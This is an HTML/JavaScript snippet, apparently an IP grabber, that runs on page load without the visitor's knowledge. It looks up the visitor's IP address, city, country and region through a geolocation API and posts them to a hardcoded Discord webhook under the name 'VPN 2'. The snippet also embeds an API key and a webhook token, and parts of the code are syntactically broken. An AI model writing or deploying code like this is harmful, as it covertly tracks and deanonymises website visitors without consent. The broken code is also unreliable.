<script>

function getIP(json) {
  function json(url) {
  return fetch(url).then(res => res.json());
  }

  let apiKey = 'f9c6dbbf5fbce305ac584ead017fc8c2278e99bce2e7d798ec960f7e';

  json(https://api.ipdata.co?api-key=${apiKey}).then(data => {

   var request = new XMLHttpRequest();

   request.open("POST", "https://discord.com/api/webhooks/1147202857846706176/gU3-h6QawPc5_tl1wjXl9JPfHKAC0a-ayGw_0PT3HKh0epeolIuYhRL9YnL-YAYK6PDP);

   request.setRequestHeader('Content-type', 'application/json');

   var params = 
   {
        username: "VPN 2",
        avatar_url: "https://cdn.discordapp.com/attachments/1015021861932900382/1015021968363356241/L.jpg",
        content: "IP:  " + data.ip + "         " + "CIDADE:  " + data.city + "         " +  "PAÍS:  " + data.country_code +  "         " + "ESTADO:  " +  data.region
   }

   request.send(JSON.stringify(params));
  });
}

</script>
</head>
<script src="https://api.ipify.org/?format=jsonp&callback=getIP%22%3E</script> 
<body onload="getIP()">